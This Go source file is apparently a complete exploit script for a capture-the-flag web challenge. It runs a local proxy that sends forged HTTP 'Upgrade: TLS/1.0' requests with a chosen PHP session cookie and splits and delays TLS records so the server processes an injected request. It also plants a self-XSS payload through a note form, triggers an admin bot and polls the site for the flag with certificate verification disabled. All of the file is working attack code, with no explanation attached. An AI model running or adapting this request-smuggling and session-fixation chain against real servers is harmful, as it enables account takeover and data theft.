package main

import (
	"bytes"
	"crypto/rand"
	"crypto/tls"
	"encoding/hex"
	"flag"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	urlpkg "net/url"
	"os"
	"strings"
	"sync/atomic"
	"time"
)

var (
	lport = flag.Int("lport", 1234, "Local port to listen for browser connections")

	rhost         = flag.String("rhost", "billyboard.digital", "Remote host to connect to")
	rport         = flag.Int("rport", 80, "Remote HTTP port for opportunistic TLS upgrade")
	cookie        = flag.String("cookie", "", "PHP session ID to use for self-xss")
	flagCookie    = flag.String("flag-cookie", "", "PHP session ID to use to exfiltrate the flag")
	contentLength = flag.Int("content-length", 950, "Content length for POST request")
	rportTLS      = flag.Int("rport-tls", 443, "Remote HTTPS port for initial GET request")
	rportBot      = flag.Int("rport-bot", 1337, "Remote HTTP port for admin bot")
	rhostBot      = flag.String("rhost-bot", "billyboard.digital", "Remote host for admin bot")
	bot           = flag.Bool("bot", false, "Call admin bot")
	checkFlag     = flag.Bool("check-flag", true, "Check for flag every 5 seconds")
	ip            = flag.String("ip", "188.68.59.215", "IP for bot")
	hmac          = flag.String("hmac", "replace_with_valid_hmac", "HMAC for bot")
	globalCount   int32
)

var tlsRecordTypes = map[byte]string{
	20: "ChangeCipherSpec",
	21: "Alert",
	22: "Handshake",
	23: "ApplicationData",
}

func main() {
	flag.Parse()

	// get two fresh session ids and prepare self xss payload
	prepareSession()

	addr := fmt.Sprintf(":%d", *lport)
	listener, err := net.Listen("tcp", addr)
	if err != nil {
		log.Fatalf("Failed to listen on %s: %v", addr, err)
	}
	log.Printf("Listening for browser on %s...", addr)

	// run flagCheck in a separate goroutine every 5 seconds
	if *checkFlag {
		go func() {
			for {
				flagCheck()
				time.Sleep(5 * time.Second)
			}
		}()
	}

	// start the admin bot
	if *bot {
		log.Printf("Starting admin bot...")
		go func() {
			adminBot()
		}()
	}

	for {
		clientConn, err := listener.Accept()
		// filter ip if needed
		/*
			if !strings.HasPrefix(clientConn.RemoteAddr().String(), "127.0.0.1") {
				log.Printf("Rejected connection from %s", clientConn.RemoteAddr().String())
				clientConn.Close()
				continue
			}
		*/
		if err != nil {
			log.Printf("Accept error: %v", err)
			continue
		}
		go handle(clientConn)
	}
}

// forward reads from src and writes to dest.
// splits TLS records and delay each one, so apache will process the injected request
func forward(src net.Conn, dest net.Conn, label string) {
	defer src.Close()
	for {
		// Read the TLS record header
		header := make([]byte, 5)
		if _, err := io.ReadFull(src, header); err != nil {
			log.Printf("[%s] header read error: %v", label, err)
			return
		}
		length := int(header[3])<<8 | int(header[4])
		payload := make([]byte, length)
		if _, err := io.ReadFull(src, payload); err != nil {
			log.Printf("[%s] payload read error: %v", label, err)
			return
		}
		rtype := tlsRecordTypes[header[0]]
		log.Printf("[%s] TLS Record %s v=%02x%02x len=%d", label, rtype, header[1], header[2], length)
		if _, err := dest.Write(append(header, payload...)); err != nil {
			log.Printf("[%s] write error: %v", label, err)
			return
		}
		time.Sleep(100 * time.Millisecond)

	}
}

func handle(client net.Conn) {
	defer client.Close()

	count := atomic.AddInt32(&globalCount, 1)
	serverAddr := fmt.Sprintf("%s:%d", *rhost, *rport)
	serverConn, err := net.Dial("tcp", serverAddr)
	if err != nil {
		log.Printf("Failed to connect to server %s: %v", serverAddr, err)
		return
	}
	defer serverConn.Close()

	var upgradeReq string

	switch {
	// chrome sends muliple client hello messages (this is different when --ignore-certificate-errors sorry), upgrade the correct once
	case count <= 2:
		upgradeReq = fmt.Sprintf(
			"GET / HTTP/1.1\r\n"+
				"Host: %s\r\n"+
				"Cookie: PHPSESSID=%s\r\n"+
				"User-Agent: UpgradeRequest 1\r\n"+
				"Upgrade: TLS/1.0\r\n"+
				"Connection: Upgrade\r\n"+
				"\r\n",
			*rhost, *cookie,
		)
	case count <= 4:
		upgradeReq = fmt.Sprintf(
			"POST / HTTP/1.1\r\n"+
				"Host: %s\r\n"+
				"Cookie: PHPSESSID=%s\r\n"+
				"User-Agent: UpgradeRequest 2\r\n"+
				"Upgrade: TLS/1.0\r\n"+
				"Connection: Upgrade, keep-alive\r\n"+
				"Content-Length: %d\r\n"+
				"\r\n",
			*rhost, "", *contentLength+16384, // fill one TLS record so apache processes the request
		)
	default:
		// close connection
		serverConn.Close()
		client.Close()
		// log the count number
		log.Printf("No more upgrade requests, closing connection (#%d).", count)
		return
	}

	log.Printf("Sending upgrade request (#%d): %s", count, strings.Split(upgradeReq, "\r\n")[0])
	if _, err := serverConn.Write([]byte(upgradeReq)); err != nil {
		log.Printf("Error sending upgrade request: %v", err)
		return
	}

	buf := make([]byte, 4096)
	n, err := serverConn.Read(buf)
	if err != nil {
		log.Printf("Error reading upgrade response: %v", err)
		return
	}
	resp := string(buf[:n])
	log.Printf("Server responded to upgrade: %s", strings.Split(resp, "\r\n")[0])

	if !strings.Contains(resp, "101 Switching Protocols") {
		log.Printf("Upgrade failed, expected 101 Switching Protocols. Aborting.")
		return
	}

	log.Printf("Upgrade successful, starting data relay...")
	// client->server
	go forward(client, serverConn, fmt.Sprintf("(#%d) C->S", count))
	// server->client
	forward(serverConn, client, fmt.Sprintf("(#%d) S->C", count))

	log.Printf("Connection closed")
}

func prepareSession() {

	if *cookie == "" {
		b := make([]byte, 16)
		rand.Read(b)
		*cookie = hex.EncodeToString(b)
	}
	if *flagCookie == "" {
		b := make([]byte, 16)
		rand.Read(b)
		*flagCookie = hex.EncodeToString(b)
	}

	log.Printf("Using PHPSESSID: %s", *cookie)
	log.Printf("Using flag PHPSESSID: %s", *flagCookie)

	payloadBytes, err := os.ReadFile("./payload.html")
	if err != nil {
		log.Fatalf("Failed to read payload.html: %v", err)
	}
	payload := strings.ReplaceAll(string(payloadBytes), "__PHPSESSID__", *flagCookie)

	client := http.DefaultClient
	endpoint := fmt.Sprintf("http://%s:%d/", *rhost, *rport)

	log.Printf("injecting selfxss payload...")
	form := urlpkg.Values{}
	form.Set("note", payload)
	postReq, err := http.NewRequest("POST", endpoint, bytes.NewBufferString(form.Encode()))
	if err != nil {
		log.Fatalf("Failed to create POST request: %v", err)
	}
	postReq.Header.Set("Cookie", "PHPSESSID="+*cookie)
	postReq.Header.Set("Content-Type", "application/x-www-form-urlencoded")

	resp, err := client.Do(postReq)
	if err != nil {
		log.Fatalf("POST request failed: %v", err)
	}
	resp.Body.Close()
	if resp.StatusCode != 200 {
		log.Fatalf("POST request returned status %d", resp.StatusCode)
	}

	// print body
	log.Printf("Self-XSS payload injected successfully.")

}

func flagCheck() {

	// disable cert verification
	t := http.DefaultTransport.(*http.Transport).Clone()
	t.TLSClientConfig = &tls.Config{InsecureSkipVerify: true}

	client := &http.Client{Transport: t}

	endpoint := fmt.Sprintf("https://%s:%d/", *rhost, *rportTLS)

	req, err := http.NewRequest("GET", endpoint, nil)
	if err != nil {
		log.Fatalf("Failed to create flag check request: %v", err)
	}
	req.Header.Set("Cookie", "PHPSESSID="+*flagCookie)
	req.Header.Set("User-Agent", "FlagCheck")
	resp, err := client.Do(req)
	if err != nil {
		log.Fatalf("Flag check request failed: %v", err)
	}
	bodyBytes, err := io.ReadAll(resp.Body)
	resp.Body.Close()
	if err != nil {
		log.Fatalf("Failed to read flag check response: %v", err)
	}

	if bytes.Contains(bodyBytes, []byte("flag{")) {
		log.Printf("FLAG: %s", bodyBytes)
		os.Exit(0)
	}

}

func adminBot() {
	client := http.DefaultClient
	endpoint := fmt.Sprintf("http://%s:%d/report", *rhostBot, *rportBot)
	log.Printf("Calling admin bot at %s", endpoint)

	json := fmt.Sprintf(`{"url":"https://%s","ip":"%s", "hmac":"%s"}`, *rhost, *ip, *hmac)

	postReq, err := http.NewRequest("POST", endpoint, bytes.NewBufferString(json))
	if err != nil {
		log.Fatalf("Failed to create admin bot request: %v", err)
	}
	postReq.Header.Set("Content-Type", "application/json")

	resp, err := client.Do(postReq)
	if err != nil {
		log.Fatalf("admin bot request failed: %v", err)
	}
	// print body
	bodyBytes, err := io.ReadAll(resp.Body)
	resp.Body.Close()
	if err != nil {
		log.Fatalf("Failed to read admin bot response: %v", err)
	}
	log.Printf("admin bot response: %s", bodyBytes)

}
